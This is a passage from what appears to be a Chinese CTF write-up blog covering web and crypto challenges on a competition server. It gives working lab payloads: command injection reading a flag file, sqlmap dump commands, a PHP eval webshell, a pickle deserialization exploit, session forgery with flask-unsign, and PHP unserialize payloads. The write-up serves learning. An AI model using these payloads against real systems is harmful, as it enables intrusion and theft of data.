class="string">&quot;\n[*] Payload 2:&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">resp2 = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>: payload2&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Step 2 Response:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp2.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:30873/?ip=| cat ../../../../flag</span><br></pre></td></tr></table></figure>

<p>即可</p>
<h3 id="小小查询系统"><a href="#小小查询系统" class="headerlink" title="小小查询系统"></a>小小查询系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://challenge.qsnctf.com:31825/?id=1</span><br><span class="line">python sqlmap.py -u http://challenge.qsnctf.com:31825/?id=1 --dbs</span><br><span class="line">python sqlmap.py -u http://challenge.qsnctf.com:31825/?id=1 -D ctf --tables</span><br><span class="line">python sqlmap.py -u http://challenge.qsnctf.com:31825/?id=1 -D ctf -T flag -C value --dump</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409130257975.png" alt="image-20250409130257975"></p>
<h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby rce"></a>baby rce</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409131142910.png" alt="image-20250409131142910"></p>
<h3 id="Input-a-number"><a href="#Input-a-number" class="headerlink" title="Input a number"></a>Input a number</h3><p>?sqctf&#x3D;114514e1</p>
<p>intval($var,$base)，其中var必填，base可选，这里base&#x3D;0,则表示根据var开始的数字决定使用的进制： 0x或0X开头使用十六进制，0开头使用八进制，否则使用十进制。 这里&#x3D;&#x3D;&#x3D;表示类型和数值必须相等，我们可以使用4476的八进制或十六进制绕过检测。 paylod：num&#x3D;010574或num&#x3D;0x117c</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409132126010.png" alt="image-20250409132126010"></p>
<h3 id="RceMe"><a href="#RceMe" class="headerlink" title="RceMe"></a>RceMe</h3><p>nl命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409133850263.png" alt="image-20250409133850263"></p>
<h3 id="Upload-Level2"><a href="#Upload-Level2" class="headerlink" title="Upload_Level2"></a>Upload_Level2</h3><p>上传一句话木马，改后缀</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409134639491.png" alt="image-20250409134639491"></p>
<h3 id="Ez-calculate"><a href="#Ez-calculate" class="headerlink" title="Ez_calculate"></a>Ez_calculate</h3><p>这道题搞了半天，是我环境有问题，卸载lxml就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:32629/&#x27;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取页面</span></span><br><span class="line">res = session.get(url)</span><br><span class="line">html = res.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用正则提取 challenge 表达式</span></span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&#x27;&lt;div class=&quot;challenge&quot;&gt;\s*([\d\+\-\*/\s\(\)]+)\s*&lt;/div&gt;&#x27;</span>, html)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;❌ 没找到表达式！&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">expr = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;✅ 提取的表达式: <span class="subst">&#123;expr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算结果</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = <span class="built_in">eval</span>(expr)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;❌ 表达式计算出错:&quot;</span>, e)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;✅ 计算结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交表单</span></span><br><span class="line">post_data = &#123;<span class="string">&#x27;value&#x27;</span>: result&#125;</span><br><span class="line">submit_res = session.post(url, data=post_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🎯 提交响应:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(submit_res.text)</span><br><span class="line"><span class="comment"># 拼接完整的 flag 地址</span></span><br><span class="line">flag_url = url + <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用同一个 session 访问 /flag</span></span><br><span class="line">flag_res = session.get(flag_url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🎉 FLAG 内容：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag_res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="白月光"><a href="#白月光" class="headerlink" title="白月光"></a>白月光</h3><p>fenjing</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409144603964.png" alt="image-20250409144603964"></p>
<h3 id="Are-you-from-SQNU"><a href="#Are-you-from-SQNU" class="headerlink" title="Are you from SQNU?"></a>Are you from SQNU?</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250411212627407.png" alt="image-20250411212627407"></p>
<h3 id="伪装"><a href="#伪装" class="headerlink" title="伪装"></a>伪装</h3><p>伪造session</p>
<p>flask-unsign –sign –cookie “{&quot;role&quot;: {&quot;is_admin&quot;: 1, &quot;name&quot;: &quot;sjx&quot;}}” –secret love</p>
<p>提交即可</p>
<h3 id="Look-for-the-homepage"><a href="#Look-for-the-homepage" class="headerlink" title="Look for the homepage"></a>Look for the homepage</h3><p>地下找到真正入口，然后如下绕过即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250411220005731.png" alt="image-20250411220005731"></p>
<h3 id="ggoodd"><a href="#ggoodd" class="headerlink" title="ggoodd"></a>ggoodd</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250411233318991.png" alt="image-20250411233318991"></p>
<h3 id="开发人员的小失误"><a href="#开发人员的小失误" class="headerlink" title="开发人员的小失误"></a>开发人员的小失误</h3><p>扫一下即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250411233550808.png" alt="image-20250411233550808"></p>
<h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.getoutput, (<span class="string">&quot;cat /flag&quot;</span>,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit())</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload).decode())</span><br></pre></td></tr></table></figure>

<p>gASVLAAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMCWNhdCAvZmxhZ5SFlFKULg&#x3D;&#x3D;</p>
<h3 id="图片展示功能"><a href="#图片展示功能" class="headerlink" title="图片展示功能"></a>图片展示功能</h3><p>做了半天以为是二次渲染，试了下.usr.ini也不行，最后发现是.htaccess，让它同样包含jpg就行</p>
<p>然后就跟之前一样，蚁剑连接即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250412102008924.png" alt="image-20250412102008924"></p>
<h3 id="无参之舞"><a href="#无参之舞" class="headerlink" title="无参之舞"></a>无参之舞</h3><p>禁用了右键</p>
<p><a target="_blank" rel="noopener" href="https://www.toolhelper.cn/Html/HtmlView">查看网页源代码 - 锤子在线工具</a></p>
<p>网站在线看源码，发现用户名为sqctf</p>
<p>弱密码爆破1q2w3e4r</p>
<p>登陆后试了….命令发现没用最后用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(&#x27;/&#x27;));</span><br><span class="line"></span><br><span class="line">?exp=print_r(scandir(&#x27;/var/www/html/&#x27;));显示Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; bg.jpg [3] =&gt; f1ag.php [4] =&gt; flag.php [5] =&gt; flag1.php [6] =&gt; flag2.php [7] =&gt; flag3.php [8] =&gt; index.php )</span><br></pre></td></tr></table></figure>

<p>试了height_file，phpfilter，readfile等</p>
<p>最后用了<strong>Hex 编码绕过文件名过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=readfile(hex2bin(%27663161672e706870%27));</span><br></pre></td></tr></table></figure>

<p>读出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250412113059441.png" alt="image-20250412113059441"></p>
<h3 id="哎呀大大大黑塔"><a href="#哎呀大大大黑塔" class="headerlink" title="哎呀大大大黑塔"></a>哎呀大大大黑塔</h3><p>bv号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?SQNU=BV1tXckehEd3</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secret</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="string">&quot;SQCTF&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;flag : &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=O%3A6%3A%22Secret%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A5%3A%22SQCTF%22%3B%7D</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250412155530564.png" alt="image-20250412155530564"></p>
<h3 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h3><p>AI出的，忘记存备份了，好像是这样吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=O:3:&quot;hhh&quot;:2:&#123;s:4:&quot;file&quot;;s:4:&quot;test&quot;;s:7:&quot;content&quot;;s:8:&quot;GET_FLAG&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="春风得意马蹄疾"><a href="#春风得意马蹄疾" class="headerlink" title="春风得意马蹄疾"></a>春风得意马蹄疾</h3><p>套娃核心价值观编码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408183110197.png" alt="image-20250408183110197"></p>
<h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>搞了半天，结果是另一种码表，还被群里的base91<strong>给误导了</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408183821108.png" alt="image-20250408183821108"></p>
<h3 id="别阴阳我了行吗？"><a href="#别阴阳我了行吗？" class="headerlink" title="别阴阳我了行吗？"></a>别阴阳我了行吗？</h3><p>阴阳怪气解密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408185716332.png" alt="image-20250408185716332"></p>
<h3 id="小白兔白又白"><a href="#小白兔白又白" class="headerlink" title="小白兔白又白"></a>小白兔白又白</h3><p>basecrack</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74798594/article/details/132991769">CTF-basecrack-Base编码分析工具安装及使用详解（MAC）-CSDN博客</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408201046191.png" alt="image-20250408201046191"></p>
<p>rabbit加解密，密钥是233，是这几个base之和，题目也提示了是Rabbit</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408201212791.png" alt="image-20250408201212791"></p>
<h3 id="简单RSA"><a href="#简单RSA" class="headerlink" title="简单RSA"></a>简单RSA</h3><p><a target="_blank" rel="noopener" href="https://factordb.com/index.php?id=1100000008137323509">factordb.com</a>分解pq</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7349515423675898192891607474991784569723846586810596813062667159281369435049497248016288479718926482987176535358013000103964873016387433732111229186113030853959182765814488023742823409594668552670824635376457830121144679902605863066189568406517231831010468189513762519884223049871926129263923438273811831862385651970651114186155355541279883465278218024789539073180081039429284499039378226284356716583185727984517316172565250133829358312221440508031140028515954553016396884149904097959425582366305748700291610280675014390376786701270107136492645593662763444032174543205008326706371954830419775515459878227148997362533</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">3514741378432598036735573845050830323348005144476193092687936757918568216312321624978086999079287619464038817665467748860146219342413630364856274551175367026504110956407511224659095481178589587424024682256076598582558926372354316897644421756280217349588811321954271963531507455604340199167652015645135632177429144241732132275792156772401511326430069756948298403519842679923368990952555264034164975975945747016304948179325381238465171723427043140473565038827474908821764094888942553863124323750256556241722284055414264534546088842593349401380142164927188943519698141315554347020239856047842258840826831077835604327616</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过费马分解得到的 p 和 q</span></span><br><span class="line">p = <span class="number">85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863611867388261</span></span><br><span class="line">q = <span class="number">85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863614460682753</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 phi(n)</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥 d</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密密文</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字节</span></span><br><span class="line">flag = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h3 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h3><p>GPT秒了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知参数</span></span><br><span class="line">n1 = <span class="number">64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681</span></span><br><span class="line">n2 = <span class="number">82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063</span></span><br><span class="line">n3 = <span class="number">62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165</span></span><br><span class="line">c2 = <span class="number">58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023</span></span><br><span class="line">c3 = <span class="number">23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用中国剩余定理（CRT）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crt</span>(<span class="params">c, n</span>):</span><br><span class="line">    N = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> ni <span class="keyword">in</span> n:</span><br><span class="line">        N *= ni</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        Ni = N // n[i]</span><br><span class="line">        mi = gmpy2.invert(Ni, n[i])</span><br><span class="line">        result += c[i] * mi * Ni</span><br><span class="line">    <span class="keyword">return</span> result % N</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 m^e</span></span><br><span class="line">m_cubed = crt([c1, c2, c3], [n1, n2, n3])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求 m = m_cubed 的立方根</span></span><br><span class="line">m, exact = gmpy2.iroot(m_cubed, e)</span><br><span class="line"><span class="keyword">if</span> exact:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 找到明文:&quot;</span>, long_to_bytes(m))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 没有找到精确立方根&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 尝试输出明文:&quot;</span>, long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="失落矿洞中的密码"><a href="#失落矿洞中的密码" class="headerlink" title="失落矿洞中的密码"></a>失落矿洞中的密码</h3><p>sageMath跑，deepseek秒出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">7654319</span></span><br><span class="line">a = <span class="number">1234577</span></span><br><span class="line">b = <span class="number">3213242</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E(<span class="number">5234568</span>, <span class="number">2287747</span>)</span><br><span class="line">public_key = E(<span class="number">2366653</span>, <span class="number">1424308</span>)</span><br><span class="line"></span><br><span class="line">secret = G.discrete_log(public_key)</span><br><span class="line"></span><br><span class="line">c1 = E(<span class="number">5081741</span>, <span class="number">6744615</span>)</span><br><span class="line">c2 = E(<span class="number">610619</span>, <span class="number">6218</span>)</span><br><span class="line"></span><br><span class="line">m = c2 - (secret * c1)</span><br><span class="line"><span class="built_in">print</span>(m[<span class="number">0</span>] + m[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408195953167.png" alt="image-20250408195953167"></p>
<h3 id="密室逃脱的终极挑战"><a href="#密室逃脱的终极挑战" class="headerlink" title="密室逃脱的终极挑战"></a>密室逃脱的终极挑战</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409101005871.png" alt="image-20250409101005871"></p>
<h3 id="丢三落四的小I"><a href="#丢三落四的小I" class="headerlink" title="丢三落四的小I"></a>丢三落四的小I</h3><p>gpt梭了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409145647568.png" alt="image-20250409145647568"></p>
